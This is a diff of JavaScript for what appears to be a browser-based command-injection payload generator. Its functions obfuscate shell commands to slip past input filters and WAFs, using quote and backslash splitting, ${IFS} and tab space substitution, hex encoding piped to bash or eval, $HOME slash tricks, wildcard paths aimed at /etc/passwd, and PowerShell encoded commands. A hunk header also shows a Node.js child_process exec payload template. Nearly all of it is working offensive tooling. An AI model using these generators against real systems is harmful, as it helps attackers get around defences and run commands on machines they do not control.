+            window.togglePresetMenu = togglePresetMenu;
+            window.selectPreset = selectPreset;
+
+            // -----
+
+
+            function ascii_2_Hex(str) {
+                var re = /[\u4E00-\u9FA5]/;
+                var ar = [];
+                for (var i = 0; i < str.length; i++) {
+                    var a = '';
+                    if (re.test(str.charAt(i))) { // 中文
+                        a = encodeURI(str.charAt(i)).replace(/%/g, '');
+                    } else {
+                        a = "\\x" + str.charCodeAt(i).toString(16);
+                    }
+                    ar.push(a);
+                }
+                str = ar.join("");
+                return str;
+            }
+
+            // Full hex encoding - encode EVERYTHING including | & ; etc.
+            // This is the correct way to hex encode commands with shell operators
+            function ascii_2_Hex_full(str) {
+                var ar = [];
+                for (var i = 0; i < str.length; i++) {
+                    ar.push("\\x" + str.charCodeAt(i).toString(16).padStart(2, '0'));
+                }
+                return ar.join("");
+            }
+
+            function ascii_2_Hex_without_black_chars(str) {
+                var regex_black_chars = /([<>|&;])/g;
+                var str_array = str.split(regex_black_chars);
+                // 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
+
+                var allstr = "";
+                str_array.forEach(
+                    function (one) {
+                        if (one.match(regex_black_chars) && one != "") {
+                            one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& 是被匹配的字符串本身
+                        } else {
+                            one = ascii_2_Hex(one);
+                        }
+                        allstr += one;
+                    }
+                );
+
+                return allstr.replace(/`echo -e ""`/g, "").replace(/`echo -e "\x20"`/g, " "); // 去除无意义的字符
+            }
+
+            // 生成不带=的base64字符串
+            function func_wise_btoa(str1) {
+                //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
+                while (1) {
+                    if (btoa(str1).indexOf("=") == -1) {//  等号不存在
+                        return btoa(str1);
+                    } else {
+                        str1 = str1 + " ";
+                    }
+
+                }
+            }
+
+            // PowerShell UTF-16LE Base64 encoding (for -EncodedCommand)
+            function powershellBase64(str) {
+                // Convert string to UTF-16LE (Little Endian)
+                const utf16le = [];
+                for (let i = 0; i < str.length; i++) {
+                    const charCode = str.charCodeAt(i);
+                    utf16le.push(charCode & 0xFF);        // Low byte
+                    utf16le.push((charCode >> 8) & 0xFF); // High byte
+                }
+                // Convert to base64
+                const binary = String.fromCharCode.apply(null, utf16le);
+                return btoa(binary);
+            }
+
+            // ========== Filter Bypass Functions (Based on PayloadsAllTheThings) ==========
+
+            // Common Linux/Unix command names to detect and process
+            const LINUX_COMMANDS = new Set([
+                // File operations
+                'cat', 'ls', 'cp', 'mv', 'rm', 'mkdir', 'rmdir', 'touch', 'chmod', 'chown', 'find', 'locate',
+                'head', 'tail', 'less', 'more', 'wc', 'diff', 'file', 'stat', 'ln', 'readlink', 'basename', 'dirname',
+                // Text processing
+                'grep', 'egrep', 'fgrep', 'sed', 'awk', 'gawk', 'cut', 'sort', 'uniq', 'tr', 'tee', 'xargs',
+                'strings', 'od', 'hexdump', 'xxd', 'base64', 'rev', 'nl', 'paste', 'join', 'comm', 'expand',
+                // Network
+                'netstat', 'ss', 'ifconfig', 'ip', 'ping', 'traceroute', 'nslookup', 'dig', 'host', 'arp',
+                'curl', 'wget', 'nc', 'netcat', 'ncat', 'socat', 'telnet', 'ssh', 'scp', 'rsync', 'ftp', 'sftp',
+                // Process/System
+                'ps', 'top', 'htop', 'kill', 'killall', 'pkill', 'pgrep', 'nice', 'nohup', 'bg', 'fg', 'jobs',
+                'id', 'whoami', 'who', 'w', 'users', 'groups', 'last', 'lastlog', 'finger', 'su', 'sudo',
+                'uname', 'hostname', 'uptime', 'dmesg', 'lsof', 'strace', 'ltrace', 'free', 'vmstat', 'iostat',
+                // Shells
+                'bash', 'sh', 'zsh', 'csh', 'tcsh', 'ksh', 'dash', 'fish',
+                // Package managers
+                'apt', 'yum', 'dnf', 'pacman', 'brew', 'pip', 'npm', 'gem', 'cargo',
+                // Compression
+                'tar', 'gzip', 'gunzip', 'bzip2', 'xz', 'zip', 'unzip', 'rar', 'unrar', '7z',
+                // Editors/Viewers
+                'vi', 'vim', 'nano', 'emacs', 'ed', 'view',
+                // Scripting
+                'python', 'python3', 'perl', 'ruby', 'php', 'node', 'lua', 'awk',
+                // Misc
+                'echo', 'printf', 'env', 'printenv', 'export', 'set', 'unset', 'alias', 'type', 'which', 'whereis',
+                'date', 'cal', 'sleep', 'watch', 'timeout', 'time', 'yes', 'true', 'false', 'test', 'expr',
+                'eval', 'exec', 'source', 'xdg-open', 'open', 'systemctl', 'service', 'journalctl',
+                // Security/Hacking
+                'nmap', 'masscan', 'nikto', 'sqlmap', 'hydra', 'john', 'hashcat', 'gobuster', 'dirb', 'ffuf',
+                'msfconsole', 'msfvenom', 'metasploit', 'burpsuite', 'wireshark', 'tcpdump', 'tshark'
+            ]);
+
+            // Shell keywords/reserved words - CANNOT be bypassed with quotes/backslashes!
+            // These are part of shell syntax, not external commands
+            const SHELL_KEYWORDS = new Set([
+                // Control flow
+                'if', 'then', 'else', 'elif', 'fi',
+                'case', 'esac',
+                'for', 'while', 'until', 'do', 'done',
+                'select', 'in',
+                // Functions and blocks
+                'function', 'time', 'coproc',
+                // Logic
+                '!', '[[', ']]', '{', '}',
+                // Job control (some are builtins but act like keywords)
+                'break', 'continue', 'return',
+                // Special
+                'local', 'declare', 'typeset', 'readonly',
+                // Zsh specific
+                'foreach', 'end', 'repeat'
+            ]);
+
+            // Check if a word is a shell keyword (cannot be bypassed)
+            function isShellKeyword(word) {
+                return SHELL_KEYWORDS.has(word.toLowerCase());
+            }
+
+            // Check if a word is a Linux command (not just any text)
+            function isCommand(word) {
+                // Shell keywords cannot be treated as commands for bypass purposes
+                if (isShellKeyword(word)) return false;
+                // Remove leading path like /bin/, /usr/bin/, etc.
+                const baseName = word.replace(/^(\/[a-z]+)+\//i, '');
+                return LINUX_COMMANDS.has(baseName.toLowerCase());
+            }
+
+            // Tokenize command string preserving structure (pipes, redirects, etc.)
+            function tokenizeCommand(str) {
+                // Split by shell operators while preserving them
+                const tokens = [];
+                let current = '';
+                let i = 0;
+
+                while (i < str.length) {
+                    const char = str[i];
+                    const nextChar = str[i + 1] || '';
+
+                    // Check for multi-char operators
+                    if ((char === '|' && nextChar === '|') ||
+                        (char === '&' && nextChar === '&') ||
+                        (char === '>' && nextChar === '>') ||
+                        (char === '<' && nextChar === '<') ||
+                        (char === '>' && nextChar === '&') ||
+                        (char === '2' && nextChar === '>')) {
+                        if (current.trim()) tokens.push({ type: 'text', value: current });
+                        current = '';
+                        tokens.push({ type: 'operator', value: char + nextChar });
+                        i += 2;
+                        continue;
+                    }
+
+                    // Single char operators
+                    if ('|;&><'.includes(char)) {
+                        if (current.trim()) tokens.push({ type: 'text', value: current });
+                        current = '';
+                        tokens.push({ type: 'operator', value: char });
+                        i++;
+                        continue;
+                    }
+
+                    current += char;
+                    i++;
+                }
+
+                if (current.trim()) tokens.push({ type: 'text', value: current });
+                return tokens;
+            }
+
+            // Apply bypass to a single command word
+            function applyBypassToWord(word, bypassFn) {
+                if (word.length < 2) return word;
+                return bypassFn(word);
+            }
+
+            // Process a command segment (between operators), applying bypass to command names
+            function processCommandSegment(segment, bypassFn) {
+                const trimmed = segment.trim();
+                if (!trimmed) return segment;
+
+                // Split into words
+                const words = trimmed.split(/(\s+)/);
+                let foundFirstCommand = false;
+
+                const processed = words.map((word, idx) => {
+                    // Skip whitespace
+                    if (/^\s+$/.test(word)) return word;
+
+                    // Skip empty
+                    if (!word) return word;
+
+                    // CRITICAL: Skip shell keywords - they CANNOT be bypassed with quotes!
+                    // while, do, done, if, then, fi, for, etc. are shell syntax, not commands
+                    if (isShellKeyword(word)) return word;
+
+                    // Skip options (start with -)
+                    if (word.startsWith('-')) return word;
+
+                    // Skip paths that are arguments (contain / but not at start or are clearly file paths)
+                    if (word.includes('/') && !word.startsWith('/bin') && !word.startsWith('/usr') && !word.startsWith('/sbin')) {
+                        // Check if it's a file path argument (like /etc/passwd)
+                        if (!isCommand(word)) return word;
+                    }
+
+                    // Skip quoted strings
+                    if (word.startsWith('"') || word.startsWith("'") || word.startsWith('`')) return word;
+
+                    // Skip variable references
+                    if (word.startsWith('$')) return word;
+
+                    // Check if this word is a command
+                    if (isCommand(word)) {
+                        foundFirstCommand = true;
+                        return applyBypassToWord(word, bypassFn);
+                    }
+
+                    // If we haven't found a command yet, this might be the command
+                    // (handles cases like custom scripts)
+                    // But NOT if it's a shell keyword!
+                    if (!foundFirstCommand && idx === 0 && !isShellKeyword(word)) {
+                        foundFirstCommand = true;
+                        return applyBypassToWord(word, bypassFn);
+                    }
+
+                    return word;
+                });
+
+                return processed.join('');
+            }
+
+            // Main function: Apply bypass to all commands in a complex command string
+            function applyBypassToAllCommands(str, bypassFn) {
+                const tokens = tokenizeCommand(str);
+                return tokens.map(token => {
+                    if (token.type === 'operator') return token.value;
+                    return processCommandSegment(token.value, bypassFn);
+                }).join('');
+            }
+
+            // ========== Individual Bypass Strategies ==========
+
+            // Single Quote: wh''oami
+            function singleQuoteEmpty(word) {
+                const mid = Math.floor(word.length / 2);
+                return word.slice(0, mid) + "''" + word.slice(mid);
+            }
+
+            // Single Quote: 'wh'oami
+            function singleQuoteWrapStart(word) {
+                const mid = Math.floor(word.length / 2);
+                return "'" + word.slice(0, mid) + "'" + word.slice(mid);
+            }
+
+            // Single Quote: w'ho'ami
+            function singleQuoteWrapMid(word) {
+                if (word.length < 3) return word;
+                const start = Math.floor(word.length / 3);
+                const end = Math.floor(word.length * 2 / 3);
+                return word.slice(0, start) + "'" + word.slice(start, end) + "'" + word.slice(end);
+            }
+
+            // Double Quote: wh""oami
+            function doubleQuoteEmpty(word) {
+                const mid = Math.floor(word.length / 2);
+                return word.slice(0, mid) + '""' + word.slice(mid);
+            }
+
+            // Double Quote: "wh"oami
+            function doubleQuoteWrapStart(word) {
+                const mid = Math.floor(word.length / 2);
+                return '"' + word.slice(0, mid) + '"' + word.slice(mid);
+            }
+
+            // Double Quote: w"ho"ami
+            function doubleQuoteWrapMid(word) {
+                if (word.length < 3) return word;
+                const start = Math.floor(word.length / 3);
+                const end = Math.floor(word.length * 2 / 3);
+                return word.slice(0, start) + '"' + word.slice(start, end) + '"' + word.slice(end);
+            }
+
+            // Backslash: w\hoami
+            function backslashSingle(word) {
+                return word[0] + '\\' + word.slice(1);
+            }
+
+            // Backslash: w\h\o\a\m\i
+            function backslashAll(word) {
+                let result = word[0];
+                for (let i = 1; i < word.length; i++) {
+                    result += '\\' + word[i];
+                }
+                return result;
+            }
+
+            // Backtick: wh``oami
+            function backtickEmpty(word) {
+                const mid = Math.floor(word.length / 2);
+                return word.slice(0, mid) + '``' + word.slice(mid);
+            }
+
+            // $@: who$@ami
+            function dollarAt(word) {
+                const mid = Math.floor(word.length / 2);
+                return word.slice(0, mid) + '$@' + word.slice(mid);
+            }
+
+            // $(): who$()ami
+            function dollarParen(word) {
+                const mid = Math.floor(word.length / 2);
+                return word.slice(0, mid) + '$()' + word.slice(mid);
+            }
+
+            // ${x}: who${x}ami
+            function dollarVar(word) {
+                const mid = Math.floor(word.length / 2);
+                return word.slice(0, mid) + '${x}' + word.slice(mid);
+            }
+
+            // ========== Wrapper Functions for Full Command Processing ==========
+
+            function bypassSingleQuoteEmpty(str) {
+                return applyBypassToAllCommands(str, singleQuoteEmpty);
+            }
+
+            function bypassSingleQuoteWrapStart(str) {
+                return applyBypassToAllCommands(str, singleQuoteWrapStart);
+            }
+
+            function bypassSingleQuoteWrapMid(str) {
+                return applyBypassToAllCommands(str, singleQuoteWrapMid);
+            }
+
+            function bypassDoubleQuoteEmpty(str) {
+                return applyBypassToAllCommands(str, doubleQuoteEmpty);
+            }
+
+            function bypassDoubleQuoteWrapStart(str) {
+                return applyBypassToAllCommands(str, doubleQuoteWrapStart);
+            }
+
+            function bypassDoubleQuoteWrapMid(str) {
+                return applyBypassToAllCommands(str, doubleQuoteWrapMid);
+            }
+
+            function bypassBackslashSingle(str) {
+                return applyBypassToAllCommands(str, backslashSingle);
+            }
+
+            function bypassBackslashAll(str) {
+                return applyBypassToAllCommands(str, backslashAll);
+            }
+
+            function bypassBacktickEmpty(str) {
+                return applyBypassToAllCommands(str, backtickEmpty);
+            }
+
+            function bypassDollarAt(str) {
+                return applyBypassToAllCommands(str, dollarAt);
+            }
+
+            function bypassDollarParen(str) {
+                return applyBypassToAllCommands(str, dollarParen);
+            }
+
+            function bypassDollarVar(str) {
+                return applyBypassToAllCommands(str, dollarVar);
+            }
+
+            // ${IFS} - Replace spaces (Bash only, not zsh)
+            // IMPORTANT: Cannot replace spaces inside quoted strings (awk, sed, etc.)
+            function bypassIFS(str) {
+                return replaceSpacesOutsideQuotes(str, '${IFS}');
+            }
+
+            // $IFS - Shorter version (Bash only)
+            function bypassIFSShort(str) {
+                return replaceSpacesOutsideQuotes(str, '$IFS');
+            }
+
+            // Helper: Replace spaces only outside of single/double quotes
+            // This is critical because ${IFS} doesn't work inside awk '{print $5}' etc.
+            function replaceSpacesOutsideQuotes(str, replacement) {
+                let result = '';
+                let inSingleQuote = false;
+                let inDoubleQuote = false;
+
+                for (let i = 0; i < str.length; i++) {
+                    const char = str[i];
+                    const prevChar = str[i - 1] || '';
+
+                    // Track quote state (ignore escaped quotes)
+                    if (char === "'" && prevChar !== '\\' && !inDoubleQuote) {
+                        inSingleQuote = !inSingleQuote;
+                        result += char;
+                    } else if (char === '"' && prevChar !== '\\' && !inSingleQuote) {
+                        inDoubleQuote = !inDoubleQuote;
+                        result += char;
+                    } else if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
+                        // Replace space only when outside quotes
+                        result += replacement;
+                    } else {
+                        result += char;
+                    }
+                }
+
+                return result;
+            }
+
+            // Brace Expansion: {cat,/etc/passwd}
+            function bypassBraceExpansion(str) {
+                const parts = str.split(' ');
+                if (parts.length < 2) return '{,' + str + ',}';
+                return '{' + parts.join(',') + '}';
+            }
+
+            // Tab (%09) - Replace spaces with tabs (URL encoded)
+            // Tab (%09) - Replace spaces with tabs (URL encoded)
+            // Also needs to skip quoted strings
+            function bypassTab(str) {
+                return replaceSpacesOutsideQuotes(str, '%09');
+            }
+
+            // Input Redirection: cat</etc/passwd
+            // ONLY works for commands that read from stdin with a file path as the LAST argument
+            // Does NOT work for replacing spaces between command and flags (e.g., ls -la)
+            function bypassInputRedirect(str) {
+                const parts = str.split(' ');
+                // Only apply if: command + file path (2 parts) or command + pattern + file (like grep root /etc/passwd)
+                if (parts.length === 2 && parts[1].startsWith('/')) {
+                    // Simple case: cat /etc/passwd → cat</etc/passwd
+                    return parts[0] + '<' + parts[1];
+                } else if (parts.length >= 2) {
+                    // Check if last part is a file path
+                    const lastPart = parts[parts.length - 1];
+                    if (lastPart.startsWith('/')) {
+                        // grep root /etc/passwd → grep root</etc/passwd
+                        return parts.slice(0, -1).join(' ') + '<' + lastPart;
+                    }
+                }
+                // Not applicable - return original with note
+                return str + '  # (< 重定向不适用于此命令)';
+            }
+
+            // Hex encoding with echo -e
+            // Hex encoding with echo -e, piped to bash for proper execution
+            // IMPORTANT: Simple backtick execution doesn't work for commands with && || ; etc.
+            // because the shell treats the output as a single command string, not parsed shell syntax
+            function bypassHexEcho(str) {
+                let hex = '';
+                for (let i = 0; i < str.length; i++) {
+                    hex += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
+                }
+                // Use pipe to bash so the decoded string is properly parsed as shell commands
+                return 'echo -e "' + hex + '"|bash';
+            }
+
+            // Alternative: eval with echo -e
+            function bypassHexEval(str) {
+                let hex = '';
+                for (let i = 0; i < str.length; i++) {
+                    hex += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
+                }
+                return 'eval $(echo -e "' + hex + '")';
+            }
+
+            // Hex encoding with ANSI-C Quoting $'...'
+            // Note: $'...' is expanded BEFORE command execution, so && ; | work correctly
+            // Hex encoding with ANSI-C Quoting $'...'
+            // IMPORTANT: $'...' creates a SINGLE STRING, not parsed as shell syntax!
+            // So "id && whoami" becomes one command name, not two commands.
+            // Only use for SIMPLE commands without && || ; | etc.
+            function bypassHexAnsi(str) {
+                // Check if command has shell operators - if so, use eval
+                let hex = '';
+                for (let i = 0; i < str.length; i++) {
+                    hex += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
+                }
+
+                if (/[&|;<>]/.test(str)) {
+                    // For complex commands, wrap in eval
+                    // Use $$ to escape $ in JavaScript replace() - $' is a special pattern!
+                    return "eval $$'" + hex + "'";
+                }
+
+                // For simple commands, $'...' works directly
+                // Use $$ to escape $ in JavaScript replace()
+                return "$$'" + hex + "'";
+            }
+
+            // Backslash + Newline (for URL encoding)
+            function bypassBackslashNewline(str) {
+                const parts = str.split(' ');
+                if (parts.length < 2) return str;
+                return parts.join('%5C%0A');
+            }
+
+            // Random Case (Windows)
+            function bypassRandomCase(str) {
+                let result = '';
+                for (let i = 0; i < str.length; i++) {
+                    if (Math.random() > 0.5) {
+                        result += str[i].toUpperCase();
+                    } else {
+                        result += str[i].toLowerCase();
+                    }
+                }
+                return result;
+            }
+
+            // ${HOME:0:1} - Replace slashes with ${HOME:0:1}
+            // /etc/passwd → ${HOME:0:1}etc${HOME:0:1}passwd
+            function bypassHomeSlash(str) {
+                return str.replace(/\//g, '${HOME:0:1}');
+            }
+
+            // ${PWD:0:1} - Alternative slash replacement
+            function bypassPwdSlash(str) {
+                return str.replace(/\//g, '${PWD:0:1}');
+            }
+
+            // Wildcard ? - Convert command and path to wildcards
+            // cat /etc/passwd → /???/??t /???/p??s??
+            function bypassWildcardQuestion(str) {
+                const tokens = tokenizeCommand(str);
+                return tokens.map(token => {
+                    if (token.type === 'operator') return token.value;
+
+                    // Process each word in the segment
+                    const words = token.value.trim().split(/(\s+)/);
+                    const processed = words.map(word => {
+                        if (/^\s+$/.test(word)) return word;
+                        if (!word) return word;
+
+                        // Skip options (start with -)
+                        if (word.startsWith('-')) return word;
+
+                        // Skip variable references
+                        if (word.startsWith('$')) return word;
+
+                        // Check if it's a command or path
+                        if (word.startsWith('/') || isCommand(word)) {
+                            // Convert to wildcards: replace most chars with ?
+                            // Keep first char and some key chars for matching
+                            return wordToWildcard(word);
+                        }
+
+                        return word;
+                    });
+
+                    return processed.join('');
+                }).join('');
+            }
+
+            // Helper: Convert a word to wildcard pattern
+            // Helper: Convert a word to wildcard pattern with ?
+            // IMPORTANT: Wildcards must include a path prefix like /???/ to work!
+            // Just "i?" won't work - shell tries to match files in current directory
+            // Note: Commands may be in /bin/, /usr/bin/, /sbin/, /usr/sbin/
+            // Helper: Convert a word to wildcard pattern with ?
+            // Strategy: Keep most characters, only replace 1 char with ?
+            // This is more precise and less likely to match wrong commands
+            function wordToWildcard(word) {
+                if (word.length < 2) return word;
+
+                // For paths like /bin/cat, /etc/passwd - keep path structure intact
+                if (word.startsWith('/')) {
+                    const parts = word.split('/').filter(p => p);
+                    const wildcardParts = parts.map(part => {
+                        if (part.length <= 2) return part; // Keep short parts as-is: /etc → /etc
+                        // Replace just ONE char in the middle: passwd → pass?d, hosts → hos?s
+                        const mid = Math.floor(part.length / 2);
+                        return part.slice(0, mid) + '?' + part.slice(mid + 1);
+                    });
+                    return '/' + wildcardParts.join('/');
+                }
+
+                // For command names without path - need to add full path
+                // Common command locations:
+                //   /bin/: cat, ls, sh, bash, echo, rm, cp, mv, chmod, mkdir, ps, kill, date, hostname
+                //   /usr/bin/: id, whoami, awk, grep, sort, uniq, head, tail, wc, cut, tr, xargs, find, which
+                //   /usr/sbin/: netstat (macOS)
+                //   /sbin/: ifconfig, ping (some systems)
+
+                const binCommands = ['cat', 'ls', 'sh', 'bash', 'echo', 'rm', 'cp', 'mv', 'chmod', 'mkdir', 'ps', 'kill', 'date', 'hostname', 'pwd', 'df', 'dd', 'ln', 'sleep', 'zsh'];
+                const usrBinCommands = ['id', 'whoami', 'awk', 'grep', 'sort', 'uniq', 'head', 'tail', 'wc', 'cut', 'tr', 'xargs', 'find', 'which', 'env', 'curl', 'wget', 'ssh', 'scp', 'nc', 'ncat', 'python', 'python3', 'perl', 'ruby', 'php', 'base64', 'xxd', 'hexdump', 'od', 'strings', 'file', 'stat', 'touch', 'less', 'more', 'vim', 'nano', 'sed', 'tee', 'nohup', 'screen', 'tmux'];
+                const usrSbinCommands = ['netstat'];
+                const sbinCommands = ['ifconfig', 'ping', 'route', 'iptables'];
+
+                let prefix = '/usr/bin/'; // default
+                if (binCommands.includes(word)) prefix = '/bin/';
+                else if (usrSbinCommands.includes(word)) prefix = '/usr/sbin/';
+                else if (sbinCommands.includes(word)) prefix = '/sbin/';
+
+                // Replace ONE char in command name: cat → c?t, whoami → whoa?i
+                let cmdWildcard;
+                if (word.length <= 2) {
+                    cmdWildcard = word[0] + '?'; // id → i?
+                } else {
+                    const mid = Math.floor(word.length / 2);
+                    cmdWildcard = word.slice(0, mid) + '?' + word.slice(mid + 1);
+                }
+
+                return prefix + cmdWildcard;
+            }
+
+            // Wildcard * - Use asterisk wildcards
+            // cat /etc/passwd → /bin/c* /etc/pas*
+            function bypassWildcardAsterisk(str) {
+                const tokens = tokenizeCommand(str);
+                return tokens.map(token => {
+                    if (token.type === 'operator') return token.value;
+
+                    const words = token.value.trim().split(/(\s+)/);
+                    const processed = words.map(word => {
+                        if (/^\s+$/.test(word)) return word;
+                        if (!word) return word;
+                        if (word.startsWith('-')) return word;
+                        if (word.startsWith('$')) return word;
+
+                        if (word.startsWith('/') || isCommand(word)) {
+                            return wordToAsterisk(word);
+                        }
+
+                        return word;
+                    });
+
+                    return processed.join('');
+                }).join('');
+            }
+
+            // Helper: Convert word to asterisk pattern
+            // IMPORTANT: Must include path prefix for commands!
+            // Helper: Convert a word to wildcard pattern with *
+            // Strategy: Keep most chars for precision, use * at end
+            // Helper: Convert a word to wildcard pattern with *
+            // WARNING: * wildcards are less precise than ? and may match multiple files!
+            // Strategy: Keep almost all chars, only replace last char with *
+            function wordToAsterisk(word) {
+                if (word.length < 2) return word;
+
+                // 不安全命令列表: 这些命令用 * 会匹配到多个文件，不做处理
+                // uniq → uni* 会匹配 unifdef, uniq, units 等
+                // sort → sor* 会匹配 sort, sortm 等 (但sort通常安全)
+                const unsafeForAsterisk = ['uniq', 'un', 'uni', 'unit', 'units'];
+                if (unsafeForAsterisk.includes(word)) {
+                    return word; // 不做通配符处理，保持原样
+                }
+
+                if (word.startsWith('/')) {
+                    const parts = word.split('/').filter(p => p);
+                    const wildcardParts = parts.map(part => {
+                        if (part.length <= 3) return part; // Keep short parts as-is: etc, bin
+                        // 检查是否是不安全的命令
+                        if (unsafeForAsterisk.includes(part)) return part;
+                        // Keep all but last char + *: passwd → passw*
+                        return part.slice(0, part.length - 1) + '*';
+                    });
+                    return '/' + wildcardParts.join('/');
+                }
+
+                // For commands: use same path logic as wordToWildcard
+                const binCommands = ['cat', 'ls', 'sh', 'bash', 'echo', 'rm', 'cp', 'mv', 'chmod', 'mkdir', 'ps', 'kill', 'date', 'hostname', 'pwd', 'df', 'dd', 'ln', 'sleep', 'zsh'];
+                const usrSbinCommands = ['netstat'];
+                const sbinCommands = ['ifconfig', 'ping', 'route', 'iptables'];
+
+                let prefix = '/usr/bin/'; // default
+                if (binCommands.includes(word)) prefix = '/bin/';
+                else if (usrSbinCommands.includes(word)) prefix = '/usr/sbin/';
+                else if (sbinCommands.includes(word)) prefix = '/sbin/';
+
+                // Keep all but last char + *: grep → gre*, sort → sor*
+                // WARNING: This may match multiple files
+                const cmdWildcard = word.slice(0, word.length - 1) + '*';
+
+                return prefix + cmdWildcard;
+            }
+
+            // Function to display payload with commands and hints separated
+            // 📌 开头的行作为提示, 其他非空行作为命令
+            // Current selected environments (multi-select)
+            let selectedEnvs = new Set(); // Empty means "show all"
+
+            // Toggle environment selection (multi-select)
+            function toggleEnv(env) {
+                if (env === 'all') {
+                    // Reset - clear all selections
+                    selectedEnvs.clear();
+                    document.querySelectorAll('.env-chip').forEach(chip => {
+                        chip.classList.remove('active');
+                    });
+                } else {
+                    // Toggle specific environment
+                    if (selectedEnvs.has(env)) {
+                        selectedEnvs.delete(env);
+                    } else {
+                        selectedEnvs.add(env);
+                    }
+                    // Update UI
+                    document.querySelectorAll('.env-chip').forEach(chip => {
+                        if (chip.dataset.env === 'all') return; // Skip reset button
+                        if (selectedEnvs.has(chip.dataset.env)) {
+                            chip.classList.add('active');
+                        } else {
+                            chip.classList.remove('active');
+                        }
+                    });
+                }
+                // Re-render all payloads with filter
+                func_oninput();
+            }
+
+            // Check if a title matches the selected environments
+            // Returns true if title matches ALL selected environments (AND logic)
+            function matchesEnv(title) {
+                // If no selection, show all
+                if (selectedEnvs.size === 0) return true;
+
+                const titleLower = title.toLowerCase();
+
+                // Define patterns for each environment
+                const envPatterns = {
+                    // Runtime environments
+                    'java': ['[java]'],
+                    'nodejs': ['[node.js]', '[nodejs]'],
+                    'shell': ['[shell]'],
+                    'web': ['[web]'],
+                    // OS environments
+                    'linux': ['[linux]', '[linux/', '/linux]', '/linux/', 'linux/macos', 'linux/macos/windows'],
+                    'macos': ['[macos]', '[macos/', '/macos]', '/macos/', 'linux/macos', 'linux/macos/windows'],
+                    'windows': ['[windows]', '[windows/', '/windows]', '/windows/', 'linux/macos/windows']
+                };
+
+                // Check if title matches ALL selected environments
+                for (const env of selectedEnvs) {
+                    const patterns = envPatterns[env] || [];
+                    let matched = false;
+
+                    for (const pattern of patterns) {
+                        if (titleLower.includes(pattern.toLowerCase())) {
+                            matched = true;
+                            break;
+                        }
+                    }
+
+                    // If any selected env doesn't match, return false
+                    if (!matched) return false;
+                }
+
+                return true;
+            }
+
+            function displayPayloadWithCommands(payloadId, payloadData) {
+                const commandsDisplay = document.getElementById(payloadId + '-commands-display');
+                if (!commandsDisplay) {
+                    console.warn(`displayPayloadWithCommands: element ${payloadId}-commands-display not found`);
+                    return;
+                }
+
+                // Clear old content
+                commandsDisplay.innerHTML = '';
+
+                if (!payloadData || payloadData.trim().length === 0) {
+                    return;
+                }
+
+                // Split by lines
+                const lines = payloadData.split('\n');
+
+                // Parse lines into sections: 
+                // 🔥 line = section title
+                // 📌 lines = hints/notes
+                // Other non-empty line = command
+                let currentSection = null;
+                const sections = [];
+
+                lines.forEach((line) => {
+                    const trimmedLine = line.trim();
+
+                    // Skip empty lines
+                    if (trimmedLine.length === 0) {
+                        return;
+                    }
+
+                    // Check if this is a section title (starts with 🔥)
+                    if (trimmedLine.startsWith('🔥')) {
+                        // Save previous section if exists
+                        if (currentSection) {
+                            sections.push(currentSection);
+                        }
+                        // Start new section with the 🔥 line as title
+                        currentSection = {
+                            title: trimmedLine.replace(/^🔥/, '').trim(),
+                            rawTitle: trimmedLine, // Keep raw title for env matching
+                            hints: [],
+                            command: null
+                        };
+                    } else if (currentSection) {
+                        // Check if this is a hint line (starts with 📌)
+                        if (trimmedLine.startsWith('📌')) {
+                            currentSection.hints.push(trimmedLine.replace(/^📌/, '').trim());
+                        } else if (!currentSection.command) {
+                            // First non-hint, non-empty line is the command
+                            currentSection.command = trimmedLine;
+                        }
+                    }
+                });
+
+                // Don't forget the last section
+                if (currentSection) {
+                    sections.push(currentSection);
+                }
+
+                // If no sections found (no 🔥 markers), treat all non-empty lines as commands
+                if (sections.length === 0) {
+                    const allCommands = lines.map(l => l.trim()).filter(l => l.length > 0);
+                    allCommands.forEach((cmd, index) => {
+                        sections.push({
+                            title: `[${index + 1}]`,
+                            rawTitle: '',
+                            hints: [],
+                            command: cmd
+                        });
+                    });
+                }
+
+                // Filter sections by environment (multi-select)
+                const filteredSections = sections.filter(section => {
+                    return matchesEnv(section.rawTitle || section.title);
+                });
+
+                // Display each section
+                let commandIndex = 1;
+                filteredSections.forEach((section) => {
+                    if (!section.command) return; // Skip sections without commands
+
                     const hintSection = document.createElement('div');
                     hintSection.className = 'hint-section';
-                    
-                    const strong = document.createElement('strong');
-                    strong.textContent = item.label;
 
-                    const cmdWrapper = document.createElement('div');
-                    cmdWrapper.className = 'code-with-copy';
-                    cmdWrapper.style.position = 'relative';
+                    // Title (from 🔥 line or index)
+                    const strong = document.createElement('strong');
+                    strong.textContent = section.title || `[${commandIndex}]`;
+                    hintSection.appendChild(strong);
+
+                    // Hints (as <p> elements, not in hint-code)
+                    if (section.hints && section.hints.length > 0) {
+                        section.hints.forEach(hint => {
+                            const p = document.createElement('p');
+                            p.textContent = hint;
+                            hintSection.appendChild(p);
+                        });
+                    }
+
+                    // Command (in hint-code with copy button)
+                    const codeWrapper = document.createElement('div');
+                    codeWrapper.className = 'code-with-copy';
+                    codeWrapper.style.position = 'relative';
 
                     const copyBtn = document.createElement('button');
                     copyBtn.className = 'copy-btn';
                     copyBtn.textContent = 'Copy';
-                    copyBtn.onclick = function(e) {
+                    copyBtn.style.position = 'absolute';
+                    copyBtn.style.top = '5px';
+                    copyBtn.style.right = '5px';
+                    copyBtn.style.zIndex = '10';
+                    copyBtn.style.opacity = '0';
+                    copyBtn.style.transition = 'opacity 0.3s ease';
+                    copyBtn.style.pointerEvents = 'auto';
+
+                    const cmdText = section.command;
+                    copyBtn.onclick = function (e) {
                         e.stopPropagation();
-                        navigator.clipboard.writeText(item.command).then(() => {
+                        navigator.clipboard.writeText(cmdText).then(() => {
                             const originalText = copyBtn.textContent;
                             copyBtn.textContent = 'Copied!';
                             setTimeout(() => {
@@ -837,216 +2300,304 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
                     const pre = document.createElement('pre');
                     pre.className = 'hint-code';
                     const code = document.createElement('code');
-                    code.textContent = item.command;
+                    code.textContent = section.command;
                     pre.appendChild(code);
 
-                    // Add hover effect to show copy button when hovering over hint-code
-                    pre.addEventListener('mouseenter', function () {
+                    // Add hover effect
+                    codeWrapper.addEventListener('mouseenter', function () {
                         copyBtn.style.opacity = '1';
                     });
